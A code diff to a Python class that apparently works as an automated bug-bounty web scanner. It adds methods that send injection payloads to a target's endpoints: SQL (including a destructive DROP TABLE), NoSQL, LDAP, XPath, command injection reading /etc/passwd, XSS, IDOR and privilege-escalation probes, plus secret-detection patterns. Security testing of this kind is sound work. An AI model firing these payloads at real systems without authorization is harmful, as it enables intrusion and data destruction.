@@ -141,7 +141,7 @@ class AdvancedProfessionalHunter:
             },
             'paramspider': {
                 'binary': 'paramspider',
-                'install_cmd': 'pip3 install paramspider',
+                'install_cmd': 'git clone https://github.com/devanshbatham/ParamSpider.git && cd ParamSpider && pip3 install -r requirements.txt',
                 'purpose': 'Parameter mining from web archives'
             },
             'gau': {
@@ -219,7 +219,7 @@ class AdvancedProfessionalHunter:
             # Cloud Security Tools
             'cloud_enum': {
                 'binary': 'cloud_enum',
-                'install_cmd': 'pip3 install cloud-enum',
+                'install_cmd': 'git clone https://github.com/initstring/cloud_enum.git && cd cloud_enum && pip3 install -r requirements.txt',
                 'purpose': 'Cloud asset enumeration'
             },
             's3scanner': {
@@ -236,12 +236,12 @@ class AdvancedProfessionalHunter:
             # Advanced SSRF Tools
             'ssrfmap': {
                 'binary': 'ssrfmap',
-                'install_cmd': 'pip3 install ssrfmap',
+                'install_cmd': 'git clone https://github.com/swisskyrepo/SSRFmap.git && cd SSRFmap && pip3 install -r requirements.txt',
                 'purpose': 'SSRF exploitation framework'
             },
             'gopherus': {
                 'binary': 'gopherus',
-                'install_cmd': 'pip3 install gopherus',
+                'install_cmd': 'git clone https://github.com/tarunkant/Gopherus.git && cd Gopherus && chmod +x gopherus.py',
                 'purpose': 'SSRF exploitation tool'
             },
             
@@ -265,7 +265,7 @@ class AdvancedProfessionalHunter:
             },
             'linkfinder': {
                 'binary': 'linkfinder',
-                'install_cmd': 'pip3 install linkfinder',
+                'install_cmd': 'git clone https://github.com/GerbenJavado/LinkFinder.git && cd LinkFinder && pip3 install -r requirements.txt',
                 'purpose': 'Endpoint discovery in JavaScript'
             },
             'secretfinder': {
@@ -402,7 +402,8 @@ class AdvancedProfessionalHunter:
                 logger.info(f"Installing {tool_name}...")
                 
                 # Check if tool already exists
-                if shutil.which(tool_config['binary']):
+                binary_name = tool_config['binary']
+                if shutil.which(binary_name) or os.path.exists(f"{self.tools_dir}/{tool_name}/{binary_name}.py") or os.path.exists(f"{self.tools_dir}/{tool_name}/{binary_name}"):
                     logger.info(f"✅ {tool_name} already installed")
                     installed_count += 1
                     continue
@@ -422,7 +423,9 @@ class AdvancedProfessionalHunter:
                     # System package installation
                     result = subprocess.run(f"sudo {install_cmd}", shell=True, capture_output=True, text=True, timeout=300)
                 elif install_cmd.startswith('git clone'):
-                    # Git repository cloning
+                    # Git repository cloning with setup
+                    # Create tools directory if it doesn't exist
+                    os.makedirs(self.tools_dir, exist_ok=True)
                     result = subprocess.run(f"cd {self.tools_dir} && {install_cmd}", shell=True, capture_output=True, text=True, timeout=300)
                 else:
                     logger.warning(f"⚠️ Custom installation required for {tool_name}")
@@ -1817,10 +1820,804 @@ class AdvancedProfessionalHunter:
         
         return False
 
-    # Additional testing methods would continue here...
-    # Including authorization flaws, injection vulnerabilities, client-side vulnerabilities,
-    # cloud misconfigurations, CORS issues, security headers, file upload vulnerabilities,
-    # deserialization vulnerabilities, and template injection testing
+    async def _test_authorization_flaws(self, target: str, recon_data: Dict[str, Any]) -> List[AdvancedVulnerability]:
+        """Test for authorization and access control vulnerabilities"""
+        vulnerabilities = []
+        
+        try:
+            endpoints = recon_data.get('endpoints', [])
+            
+            for endpoint in endpoints[:10]:  # Test top 10 endpoints
+                url = f"https://{target}{endpoint}" if not endpoint.startswith('http') else endpoint
+                
+                # Test IDOR (Insecure Direct Object References)
+                idor_vulns = await self._test_idor_vulnerabilities(url)
+                vulnerabilities.extend(idor_vulns)
+                
+                # Test privilege escalation
+                priv_vulns = await self._test_privilege_escalation(url)
+                vulnerabilities.extend(priv_vulns)
+                
+                # Test horizontal access control
+                horizontal_vulns = await self._test_horizontal_access_control(url)
+                vulnerabilities.extend(horizontal_vulns)
+                
+        except Exception as e:
+            logger.error(f"Error testing authorization flaws: {str(e)}")
+        
+        return vulnerabilities
+
+    async def _test_idor_vulnerabilities(self, url: str) -> List[AdvancedVulnerability]:
+        """Test for Insecure Direct Object Reference vulnerabilities"""
+        vulnerabilities = []
+        
+        # IDOR test patterns
+        idor_patterns = [
+            {'param': 'id', 'values': ['1', '2', '100', '999', '../1', '../../2']},
+            {'param': 'user_id', 'values': ['1', '2', 'admin', '0']},
+            {'param': 'account_id', 'values': ['1', '2', '999']},
+            {'param': 'file_id', 'values': ['1', '2', '../etc/passwd']},
+        ]
+        
+        for pattern in idor_patterns:
+            for value in pattern['values']:
+                try:
+                    test_url = f"{url}?{pattern['param']}={value}"
+                    
+                    async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=10)) as session:
+                        async with session.get(test_url) as response:
+                            if response.status == 200:
+                                content = await response.text()
+                                
+                                # Check for sensitive data exposure
+                                if self._check_sensitive_data_exposure(content):
+                                    vuln = AdvancedVulnerability(
+                                        type="IDOR",
+                                        severity="HIGH",
+                                        confidence=0.8,
+                                        url=test_url,
+                                        description=f"Insecure Direct Object Reference found - parameter '{pattern['param']}' allows access to unauthorized data",
+                                        impact="Unauthorized access to sensitive data",
+                                        recommendation="Implement proper access controls and validate user permissions",
+                                        payload=f"{pattern['param']}={value}",
+                                        evidence=content[:500]
+                                    )
+                                    vulnerabilities.append(vuln)
+                                    
+                except Exception as e:
+                    logger.debug(f"IDOR test error for {test_url}: {str(e)}")
+        
+        return vulnerabilities
+
+    def _check_sensitive_data_exposure(self, content: str) -> bool:
+        """Check if content contains sensitive data"""
+        sensitive_patterns = [
+            r'email.*@.*\.',
+            r'password.*:',
+            r'ssn.*\d{3}-\d{2}-\d{4}',
+            r'credit.*card.*\d{4}',
+            r'api.*key.*[a-zA-Z0-9]{20,}',
+            r'token.*[a-zA-Z0-9]{20,}',
+            r'private.*key',
+            r'secret.*[a-zA-Z0-9]{10,}'
+        ]
+        
+        for pattern in sensitive_patterns:
+            if re.search(pattern, content, re.IGNORECASE):
+                return True
+        return False
+
+    async def _test_privilege_escalation(self, url: str) -> List[AdvancedVulnerability]:
+        """Test for privilege escalation vulnerabilities"""
+        vulnerabilities = []
+        
+        escalation_tests = [
+            {'param': 'role', 'values': ['admin', 'administrator', 'root', 'superuser']},
+            {'param': 'privilege', 'values': ['admin', '1', 'true']},
+            {'param': 'is_admin', 'values': ['true', '1', 'yes']},
+            {'param': 'user_type', 'values': ['admin', 'administrator', 'manager']},
+        ]
+        
+        for test in escalation_tests:
+            for value in test['values']:
+                try:
+                    test_url = f"{url}?{test['param']}={value}"
+                    
+                    async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=10)) as session:
+                        async with session.get(test_url) as response:
+                            if response.status == 200:
+                                content = await response.text()
+                                
+                                # Check for admin functionality
+                                if self._check_admin_functionality(content):
+                                    vuln = AdvancedVulnerability(
+                                        type="Privilege Escalation",
+                                        severity="CRITICAL",
+                                        confidence=0.9,
+                                        url=test_url,
+                                        description=f"Privilege escalation vulnerability - parameter '{test['param']}' grants elevated privileges",
+                                        impact="Unauthorized administrative access",
+                                        recommendation="Implement proper role-based access control",
+                                        payload=f"{test['param']}={value}",
+                                        evidence=content[:500]
+                                    )
+                                    vulnerabilities.append(vuln)
+                                    
+                except Exception as e:
+                    logger.debug(f"Privilege escalation test error: {str(e)}")
+        
+        return vulnerabilities
+
+    def _check_admin_functionality(self, content: str) -> bool:
+        """Check if content contains admin functionality"""
+        admin_indicators = [
+            'admin panel', 'administrator', 'manage users', 'delete user',
+            'system settings', 'configuration', 'user management',
+            'admin dashboard', 'control panel', 'system admin'
+        ]
+        
+        content_lower = content.lower()
+        return any(indicator in content_lower for indicator in admin_indicators)
+
+    async def _test_horizontal_access_control(self, url: str) -> List[AdvancedVulnerability]:
+        """Test for horizontal access control issues"""
+        vulnerabilities = []
+        
+        # Test user enumeration and horizontal access
+        user_tests = [
+            {'param': 'user', 'values': ['user1', 'user2', 'testuser', 'admin']},
+            {'param': 'username', 'values': ['alice', 'bob', 'charlie', 'admin']},
+            {'param': 'email', 'values': ['test@test.com', 'admin@test.com', 'user@test.com']},
+        ]
+        
+        for test in user_tests:
+            for value in test['values']:
+                try:
+                    test_url = f"{url}?{test['param']}={value}"
+                    
+                    async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=10)) as session:
+                        async with session.get(test_url) as response:
+                            if response.status == 200:
+                                content = await response.text()
+                                
+                                # Check for user data exposure
+                                if self._check_user_data_exposure(content, value):
+                                    vuln = AdvancedVulnerability(
+                                        type="Horizontal Access Control",
+                                        severity="HIGH",
+                                        confidence=0.7,
+                                        url=test_url,
+                                        description=f"Horizontal access control bypass - can access other users' data via '{test['param']}'",
+                                        impact="Unauthorized access to other users' data",
+                                        recommendation="Implement proper user session validation",
+                                        payload=f"{test['param']}={value}",
+                                        evidence=content[:500]
+                                    )
+                                    vulnerabilities.append(vuln)
+                                    
+                except Exception as e:
+                    logger.debug(f"Horizontal access control test error: {str(e)}")
+        
+        return vulnerabilities
+
+    def _check_user_data_exposure(self, content: str, test_value: str) -> bool:
+        """Check if content exposes user-specific data"""
+        # Look for user-specific information
+        user_data_patterns = [
+            r'profile.*' + re.escape(test_value),
+            r'account.*' + re.escape(test_value),
+            r'personal.*information',
+            r'private.*data',
+            r'confidential'
+        ]
+        
+        for pattern in user_data_patterns:
+            if re.search(pattern, content, re.IGNORECASE):
+                return True
+        return False
+
+    async def _test_injection_vulnerabilities(self, target: str, recon_data: Dict[str, Any]) -> List[AdvancedVulnerability]:
+        """Test for various injection vulnerabilities"""
+        vulnerabilities = []
+        
+        try:
+            endpoints = recon_data.get('endpoints', [])
+            
+            for endpoint in endpoints[:15]:  # Test top 15 endpoints
+                url = f"https://{target}{endpoint}" if not endpoint.startswith('http') else endpoint
+                
+                # Test SQL injection
+                sql_vulns = await self._test_advanced_sql_injection(url)
+                vulnerabilities.extend(sql_vulns)
+                
+                # Test NoSQL injection
+                nosql_vulns = await self._test_nosql_injection(url)
+                vulnerabilities.extend(nosql_vulns)
+                
+                # Test LDAP injection
+                ldap_vulns = await self._test_ldap_injection(url)
+                vulnerabilities.extend(ldap_vulns)
+                
+                # Test Command injection
+                cmd_vulns = await self._test_command_injection(url)
+                vulnerabilities.extend(cmd_vulns)
+                
+                # Test XPath injection
+                xpath_vulns = await self._test_xpath_injection(url)
+                vulnerabilities.extend(xpath_vulns)
+                
+        except Exception as e:
+            logger.error(f"Error testing injection vulnerabilities: {str(e)}")
+        
+        return vulnerabilities
+
+    async def _test_advanced_sql_injection(self, url: str) -> List[AdvancedVulnerability]:
+        """Test for advanced SQL injection vulnerabilities"""
+        vulnerabilities = []
+        
+        # Advanced SQL injection payloads
+        sql_payloads = [
+            "' OR '1'='1",
+            "' OR '1'='1' --",
+            "' OR '1'='1' /*",
+            "'; DROP TABLE users; --",
+            "' UNION SELECT 1,2,3,4,5 --",
+            "' UNION SELECT NULL,NULL,NULL --",
+            "' AND (SELECT COUNT(*) FROM information_schema.tables)>0 --",
+            "' AND (SELECT SUBSTRING(@@version,1,1))='5' --",
+            "' OR SLEEP(5) --",
+            "' OR pg_sleep(5) --",
+            "'; WAITFOR DELAY '00:00:05' --",
+            "' OR BENCHMARK(5000000,MD5(1)) --"
+        ]
+        
+        for payload in sql_payloads:
+            try:
+                # Test in URL parameters
+                test_url = f"{url}?id={urllib.parse.quote(payload)}"
+                
+                start_time = time.time()
+                async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=15)) as session:
+                    async with session.get(test_url) as response:
+                        response_time = time.time() - start_time
+                        content = await response.text()
+                        
+                        # Check for SQL errors
+                        if self._check_sql_errors(content):
+                            vuln = AdvancedVulnerability(
+                                type="SQL Injection",
+                                severity="CRITICAL",
+                                confidence=0.9,
+                                url=test_url,
+                                description=f"SQL injection vulnerability detected with payload: {payload}",
+                                impact="Database compromise, data theft, data manipulation",
+                                recommendation="Use parameterized queries and input validation",
+                                payload=payload,
+                                evidence=content[:500]
+                            )
+                            vulnerabilities.append(vuln)
+                        
+                        # Check for time-based SQL injection
+                        elif response_time > 4 and ('SLEEP' in payload or 'WAITFOR' in payload or 'pg_sleep' in payload or 'BENCHMARK' in payload):
+                            vuln = AdvancedVulnerability(
+                                type="Time-based SQL Injection",
+                                severity="CRITICAL",
+                                confidence=0.8,
+                                url=test_url,
+                                description=f"Time-based SQL injection detected - response delayed by {response_time:.2f} seconds",
+                                impact="Database compromise through blind SQL injection",
+                                recommendation="Use parameterized queries and input validation",
+                                payload=payload,
+                                evidence=f"Response time: {response_time:.2f} seconds"
+                            )
+                            vulnerabilities.append(vuln)
+                            
+            except Exception as e:
+                logger.debug(f"SQL injection test error: {str(e)}")
+        
+        return vulnerabilities
+
+    def _check_sql_errors(self, content: str) -> bool:
+        """Check for SQL error messages"""
+        sql_errors = [
+            'mysql_fetch_array', 'mysql_num_rows', 'mysql_error',
+            'postgresql error', 'warning: pg_', 'valid postgresql result',
+            'oracle error', 'ora-[0-9]{5}', 'microsoft ole db provider',
+            'sqlite_exception', 'sqlite error', 'sqlstate',
+            'syntax error', 'mysql server version', 'table.*doesn.*exist',
+            'column.*not found', 'invalid column name', 'unknown column'
+        ]
+        
+        content_lower = content.lower()
+        for error in sql_errors:
+            if re.search(error, content_lower):
+                return True
+        return False
+
+    async def _test_nosql_injection(self, url: str) -> List[AdvancedVulnerability]:
+        """Test for NoSQL injection vulnerabilities"""
+        vulnerabilities = []
+        
+        nosql_payloads = [
+            "[$ne]=null",
+            "[$regex]=.*",
+            "[$where]=1",
+            "[$gt]=",
+            "[$lt]=",
+            "[$exists]=true",
+            "[$in][]=admin",
+            "[$nin][]=user"
+        ]
+        
+        for payload in nosql_payloads:
+            try:
+                test_url = f"{url}?id={urllib.parse.quote(payload)}"
+                
+                async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=10)) as session:
+                    async with session.get(test_url) as response:
+                        content = await response.text()
+                        
+                        if self._check_nosql_errors(content) or response.status == 500:
+                            vuln = AdvancedVulnerability(
+                                type="NoSQL Injection",
+                                severity="HIGH",
+                                confidence=0.7,
+                                url=test_url,
+                                description=f"NoSQL injection vulnerability detected with payload: {payload}",
+                                impact="Database compromise, unauthorized data access",
+                                recommendation="Validate and sanitize input, use proper query builders",
+                                payload=payload,
+                                evidence=content[:500]
+                            )
+                            vulnerabilities.append(vuln)
+                            
+            except Exception as e:
+                logger.debug(f"NoSQL injection test error: {str(e)}")
+        
+        return vulnerabilities
+
+    def _check_nosql_errors(self, content: str) -> bool:
+        """Check for NoSQL error messages"""
+        nosql_errors = [
+            'mongodb', 'mongo error', 'bson', 'couchdb error',
+            'redis error', 'cassandra error', 'dynamodb error',
+            'document not found', 'invalid bson', 'query failed'
+        ]
+        
+        content_lower = content.lower()
+        return any(error in content_lower for error in nosql_errors)
+
+    async def _test_ldap_injection(self, url: str) -> List[AdvancedVulnerability]:
+        """Test for LDAP injection vulnerabilities"""
+        vulnerabilities = []
+        
+        ldap_payloads = [
+            "*",
+            "*)(&",
+            "*))%00",
+            ")(cn=*",
+            "*(|(mail=*))",
+            "*(|(objectclass=*))",
+            "*)(uid=*))(|(uid=*"
+        ]
+        
+        for payload in ldap_payloads:
+            try:
+                test_url = f"{url}?search={urllib.parse.quote(payload)}"
+                
+                async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=10)) as session:
+                    async with session.get(test_url) as response:
+                        content = await response.text()
+                        
+                        if self._check_ldap_errors(content):
+                            vuln = AdvancedVulnerability(
+                                type="LDAP Injection",
+                                severity="HIGH",
+                                confidence=0.8,
+                                url=test_url,
+                                description=f"LDAP injection vulnerability detected with payload: {payload}",
+                                impact="Unauthorized LDAP directory access",
+                                recommendation="Validate and escape LDAP queries",
+                                payload=payload,
+                                evidence=content[:500]
+                            )
+                            vulnerabilities.append(vuln)
+                            
+            except Exception as e:
+                logger.debug(f"LDAP injection test error: {str(e)}")
+        
+        return vulnerabilities
+
+    def _check_ldap_errors(self, content: str) -> bool:
+        """Check for LDAP error messages"""
+        ldap_errors = [
+            'ldap error', 'invalid dn syntax', 'ldap search failed',
+            'bad search filter', 'ldap bind failed', 'ldap_search'
+        ]
+        
+        content_lower = content.lower()
+        return any(error in content_lower for error in ldap_errors)
+
+    async def _test_command_injection(self, url: str) -> List[AdvancedVulnerability]:
+        """Test for command injection vulnerabilities"""
+        vulnerabilities = []
+        
+        cmd_payloads = [
+            "; ls",
+            "| ls",
+            "& ls",
+            "; cat /etc/passwd",
+            "| cat /etc/passwd",
+            "; whoami",
+            "| whoami",
+            "; id",
+            "| id",
+            "; sleep 5",
+            "| sleep 5",
+            "; ping -c 1 127.0.0.1",
+            "| ping -c 1 127.0.0.1"
+        ]
+        
+        for payload in cmd_payloads:
+            try:
+                test_url = f"{url}?cmd={urllib.parse.quote(payload)}"
+                
+                start_time = time.time()
+                async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=15)) as session:
+                    async with session.get(test_url) as response:
+                        response_time = time.time() - start_time
+                        content = await response.text()
+                        
+                        # Check for command output
+                        if self._check_command_output(content):
+                            vuln = AdvancedVulnerability(
+                                type="Command Injection",
+                                severity="CRITICAL",
+                                confidence=0.9,
+                                url=test_url,
+                                description=f"Command injection vulnerability detected with payload: {payload}",
+                                impact="Remote code execution, system compromise",
+                                recommendation="Validate input and avoid system calls",
+                                payload=payload,
+                                evidence=content[:500]
+                            )
+                            vulnerabilities.append(vuln)
+                        
+                        # Check for time-based command injection
+                        elif response_time > 4 and 'sleep' in payload:
+                            vuln = AdvancedVulnerability(
+                                type="Time-based Command Injection",
+                                severity="CRITICAL",
+                                confidence=0.8,
+                                url=test_url,
+                                description=f"Time-based command injection detected - response delayed by {response_time:.2f} seconds",
+                                impact="Remote code execution through blind command injection",
+                                recommendation="Validate input and avoid system calls",
+                                payload=payload,
+                                evidence=f"Response time: {response_time:.2f} seconds"
+                            )
+                            vulnerabilities.append(vuln)
+                            
+            except Exception as e:
+                logger.debug(f"Command injection test error: {str(e)}")
+        
+        return vulnerabilities
+
+    def _check_command_output(self, content: str) -> bool:
+        """Check for command execution output"""
+        command_indicators = [
+            'root:', 'bin:', 'daemon:', '/bin/bash', '/bin/sh',
+            'uid=', 'gid=', 'groups=', 'total ', 'drwx',
+            'PING ', 'ping statistics', '64 bytes from'
+        ]
+        
+        return any(indicator in content for indicator in command_indicators)
+
+    async def _test_xpath_injection(self, url: str) -> List[AdvancedVulnerability]:
+        """Test for XPath injection vulnerabilities"""
+        vulnerabilities = []
+        
+        xpath_payloads = [
+            "' or '1'='1",
+            "' or 1=1 or ''='",
+            "x' or name()='username' or 'x'='y",
+            "' or position()=1 or ''='",
+            "' or count(//*)>0 or ''='",
+            "' or string-length(name(/*[1]))>0 or ''='"
+        ]
+        
+        for payload in xpath_payloads:
+            try:
+                test_url = f"{url}?search={urllib.parse.quote(payload)}"
+                
+                async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=10)) as session:
+                    async with session.get(test_url) as response:
+                        content = await response.text()
+                        
+                        if self._check_xpath_errors(content):
+                            vuln = AdvancedVulnerability(
+                                type="XPath Injection",
+                                severity="HIGH",
+                                confidence=0.7,
+                                url=test_url,
+                                description=f"XPath injection vulnerability detected with payload: {payload}",
+                                impact="XML data extraction, authentication bypass",
+                                recommendation="Use parameterized XPath queries",
+                                payload=payload,
+                                evidence=content[:500]
+                            )
+                            vulnerabilities.append(vuln)
+                            
+            except Exception as e:
+                logger.debug(f"XPath injection test error: {str(e)}")
+        
+        return vulnerabilities
+
+    def _check_xpath_errors(self, content: str) -> bool:
+        """Check for XPath error messages"""
+        xpath_errors = [
+            'xpath syntax error', 'xpath expression', 'invalid xpath',
+            'xpath error', 'malformed xpath', 'xpath parse error'
+        ]
+        
+        content_lower = content.lower()
+        return any(error in content_lower for error in xpath_errors)
+
+    async def _test_client_side_vulnerabilities(self, target: str, recon_data: Dict[str, Any]) -> List[AdvancedVulnerability]:
+        """Test for client-side vulnerabilities"""
+        vulnerabilities = []
+        
+        try:
+            # Test XSS vulnerabilities
+            xss_vulns = await self._test_advanced_xss(target, recon_data)
+            vulnerabilities.extend(xss_vulns)
+            
+            # Test DOM-based vulnerabilities
+            dom_vulns = await self._test_dom_vulnerabilities(target, recon_data)
+            vulnerabilities.extend(dom_vulns)
+            
+            # Test CSRF vulnerabilities
+            csrf_vulns = await self._test_csrf_vulnerabilities(target, recon_data)
+            vulnerabilities.extend(csrf_vulns)
+            
+            # Test clickjacking
+            clickjack_vulns = await self._test_clickjacking(target, recon_data)
+            vulnerabilities.extend(clickjack_vulns)
+            
+        except Exception as e:
+            logger.error(f"Error testing client-side vulnerabilities: {str(e)}")
+        
+        return vulnerabilities
+
+    async def _test_advanced_xss(self, target: str, recon_data: Dict[str, Any]) -> List[AdvancedVulnerability]:
+        """Test for advanced XSS vulnerabilities"""
+        vulnerabilities = []
+        
+        # Advanced XSS payloads
+        xss_payloads = [
+            "<script>alert('XSS')</script>",
+            "<img src=x onerror=alert('XSS')>",
+            "<svg onload=alert('XSS')>",
+            "javascript:alert('XSS')",
+            "<iframe src=javascript:alert('XSS')>",
+            "<body onload=alert('XSS')>",
+            "<input onfocus=alert('XSS') autofocus>",
+            "<select onfocus=alert('XSS') autofocus>",
+            "<textarea onfocus=alert('XSS') autofocus>",
+            "<keygen onfocus=alert('XSS') autofocus>",
+            "<video><source onerror=alert('XSS')>",
+            "<audio src=x onerror=alert('XSS')>",
+            "<details open ontoggle=alert('XSS')>",
+            "<marquee onstart=alert('XSS')>",
+            "'-alert('XSS')-'",
+            "\";alert('XSS');//",
+            "</script><script>alert('XSS')</script>",
+            "<script>alert(String.fromCharCode(88,83,83))</script>",
+            "<img src=\"javascript:alert('XSS')\">",
+            "<div onmouseover=\"alert('XSS')\">test</div>"
+        ]
+        
+        endpoints = recon_data.get('endpoints', [])
+        
+        for endpoint in endpoints[:10]:
+            url = f"https://{target}{endpoint}" if not endpoint.startswith('http') else endpoint
+            
+            for payload in xss_payloads:
+                try:
+                    # Test in URL parameters
+                    test_url = f"{url}?q={urllib.parse.quote(payload)}"
+                    
+                    async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=10)) as session:
+                        async with session.get(test_url) as response:
+                            content = await response.text()
+                            
+                            # Check if payload is reflected
+                            if payload in content or urllib.parse.unquote(payload) in content:
+                                # Check if it's actually executable (not encoded)
+                                if self._check_xss_execution(content, payload):
+                                    vuln = AdvancedVulnerability(
+                                        type="Cross-Site Scripting (XSS)",
+                                        severity="HIGH",
+                                        confidence=0.9,
+                                        url=test_url,
+                                        description=f"Reflected XSS vulnerability detected with payload: {payload}",
+                                        impact="Session hijacking, credential theft, defacement",
+                                        recommendation="Implement proper input validation and output encoding",
+                                        payload=payload,
+                                        evidence=content[:500]
+                                    )
+                                    vulnerabilities.append(vuln)
+                                    
+                except Exception as e:
+                    logger.debug(f"XSS test error: {str(e)}")
+        
+        return vulnerabilities
+
+    def _check_xss_execution(self, content: str, payload: str) -> bool:
+        """Check if XSS payload can execute"""
+        # Check if payload is properly reflected without encoding
+        dangerous_patterns = [
+            '<script', '<img', '<svg', '<iframe', '<body', '<input',
+            'javascript:', 'onerror=', 'onload=', 'onfocus=', 'onmouseover='
+        ]
+        
+        payload_lower = payload.lower()
+        content_lower = content.lower()
+        
+        for pattern in dangerous_patterns:
+            if pattern in payload_lower and pattern in content_lower:
+                # Check if it's not HTML encoded
+                if '&lt;' not in content and '&gt;' not in content:
+                    return True
+        
+        return False
+
+    async def _test_dom_vulnerabilities(self, target: str, recon_data: Dict[str, Any]) -> List[AdvancedVulnerability]:
+        """Test for DOM-based vulnerabilities"""
+        vulnerabilities = []
+        
+        # DOM XSS test vectors
+        dom_payloads = [
+            "#<script>alert('DOM-XSS')</script>",
+            "#<img src=x onerror=alert('DOM-XSS')>",
+            "#javascript:alert('DOM-XSS')",
+            "#data:text/html,<script>alert('DOM-XSS')</script>",
+            "#<svg onload=alert('DOM-XSS')>"
+        ]
+        
+        endpoints = recon_data.get('endpoints', [])
+        
+        for endpoint in endpoints[:5]:
+            url = f"https://{target}{endpoint}" if not endpoint.startswith('http') else endpoint
+            
+            for payload in dom_payloads:
+                try:
+                    test_url = f"{url}{payload}"
+                    
+                    async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=10)) as session:
+                        async with session.get(test_url) as response:
+                            content = await response.text()
+                            
+                            # Check for DOM manipulation patterns
+                            if self._check_dom_manipulation(content):
+                                vuln = AdvancedVulnerability(
+                                    type="DOM-based XSS",
+                                    severity="HIGH",
+                                    confidence=0.8,
+                                    url=test_url,
+                                    description=f"DOM-based XSS vulnerability detected with payload: {payload}",
+                                    impact="Client-side code execution, session hijacking",
+                                    recommendation="Validate and sanitize DOM manipulation",
+                                    payload=payload,
+                                    evidence=content[:500]
+                                )
+                                vulnerabilities.append(vuln)
+                                
+                except Exception as e:
+                    logger.debug(f"DOM XSS test error: {str(e)}")
+        
+        return vulnerabilities
+
+    def _check_dom_manipulation(self, content: str) -> bool:
+        """Check for DOM manipulation patterns"""
+        dom_patterns = [
+            'document.write', 'innerHTML', 'outerHTML',
+            'document.location', 'window.location', 'location.href',
+            'document.URL', 'document.documentURI', 'location.search',
+            'location.hash', 'eval(', 'setTimeout(', 'setInterval('
+        ]
+        
+        return any(pattern in content for pattern in dom_patterns)
+
+    async def _test_csrf_vulnerabilities(self, target: str, recon_data: Dict[str, Any]) -> List[AdvancedVulnerability]:
+        """Test for CSRF vulnerabilities"""
+        vulnerabilities = []
+        
+        endpoints = recon_data.get('endpoints', [])
+        
+        for endpoint in endpoints[:5]:
+            url = f"https://{target}{endpoint}" if not endpoint.startswith('http') else endpoint
+            
+            try:
+                async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=10)) as session:
+                    # Check for forms
+                    async with session.get(url) as response:
+                        content = await response.text()
+                        
+                        if '<form' in content.lower():
+                            # Check for CSRF tokens
+                            if not self._check_csrf_protection(content):
+                                vuln = AdvancedVulnerability(
+                                    type="Cross-Site Request Forgery (CSRF)",
+                                    severity="MEDIUM",
+                                    confidence=0.7,
+                                    url=url,
+                                    description="Form lacks CSRF protection tokens",
+                                    impact="Unauthorized actions on behalf of authenticated users",
+                                    recommendation="Implement CSRF tokens and SameSite cookies",
+                                    payload="N/A",
+                                    evidence="Form found without CSRF token"
+                                )
+                                vulnerabilities.append(vuln)
+                                
+            except Exception as e:
+                logger.debug(f"CSRF test error: {str(e)}")
+        
+        return vulnerabilities
+
+    def _check_csrf_protection(self, content: str) -> bool:
+        """Check for CSRF protection mechanisms"""
+        csrf_patterns = [
+            'csrf_token', 'csrftoken', '_token', 'authenticity_token',
+            'csrf-token', 'anti-csrf', 'xsrf-token', '__RequestVerificationToken'
+        ]
+        
+        content_lower = content.lower()
+        return any(pattern in content_lower for pattern in csrf_patterns)
+
+    async def _test_clickjacking(self, target: str, recon_data: Dict[str, Any]) -> List[AdvancedVulnerability]:
+        """Test for clickjacking vulnerabilities"""
+        vulnerabilities = []
+        
+        try:
+            url = f"https://{target}"
+            
+            async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=10)) as session:
+                async with session.get(url) as response:
+                    headers = response.headers
+                    
+                    # Check for X-Frame-Options header
+                    x_frame_options = headers.get('X-Frame-Options', '').lower()
+                    csp = headers.get('Content-Security-Policy', '').lower()
+                    
+                    vulnerable = True
+                    
+                    # Check X-Frame-Options
+                    if x_frame_options in ['deny', 'sameorigin']:
+                        vulnerable = False
+                    
+                    # Check CSP frame-ancestors
+                    if 'frame-ancestors' in csp and ("'none'" in csp or "'self'" in csp):
+                        vulnerable = False
+                    
+                    if vulnerable:
+                        vuln = AdvancedVulnerability(
+                            type="Clickjacking",
+                            severity="MEDIUM",
+                            confidence=0.8,
+                            url=url,
+                            description="Missing clickjacking protection headers",
+                            impact="UI redressing attacks, unauthorized actions",
+                            recommendation="Implement X-Frame-Options or CSP frame-ancestors",
+                            payload="N/A",
+                            evidence=f"X-Frame-Options: {x_frame_options or 'Missing'}"
+                        )
+                        vulnerabilities.append(vuln)
+                        
+        except Exception as e:
+            logger.debug(f"Clickjacking test error: {str(e)}")
+        
+        return vulnerabilities
     
     async def generate_comprehensive_report(self, target: str, vulnerabilities: List[AdvancedVulnerability]) -> Dict[str, Any]:
         """Generate comprehensive professional report"""
@@ -2027,6 +2824,354 @@ This assessment employed advanced bug bounty hunting techniques including:
             'reputational_impact': 'High' if critical_count > 0 else 'Medium',
             'operational_impact': 'High' if critical_count > 2 else 'Low'
         }
+
+    async def _test_cloud_misconfigurations(self, target: str, recon_data: Dict[str, Any]) -> List[AdvancedVulnerability]:
+        """Test for cloud misconfigurations"""
+        vulnerabilities = []
+        
+        try:
+            # Test for exposed cloud storage
+            cloud_tests = [
+                f"https://{target}.s3.amazonaws.com",
+                f"https://s3.amazonaws.com/{target}",
+                f"https://{target}.blob.core.windows.net",
+                f"https://storage.googleapis.com/{target}",
+                f"https://{target}.storage.googleapis.com"
+            ]
+            
+            for cloud_url in cloud_tests:
+                try:
+                    async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=10)) as session:
+                        async with session.get(cloud_url) as response:
+                            if response.status == 200:
+                                content = await response.text()
+                                
+                                if self._check_cloud_exposure(content):
+                                    vuln = AdvancedVulnerability(
+                                        type="Cloud Storage Misconfiguration",
+                                        severity="HIGH",
+                                        confidence=0.9,
+                                        url=cloud_url,
+                                        description="Publicly accessible cloud storage bucket detected",
+                                        impact="Data exposure, unauthorized access to stored files",
+                                        recommendation="Configure proper access controls and bucket policies",
+                                        payload="N/A",
+                                        evidence=content[:500]
+                                    )
+                                    vulnerabilities.append(vuln)
+                                    
+                except Exception as e:
+                    logger.debug(f"Cloud test error for {cloud_url}: {str(e)}")
+                    
+        except Exception as e:
+            logger.error(f"Error testing cloud misconfigurations: {str(e)}")
+        
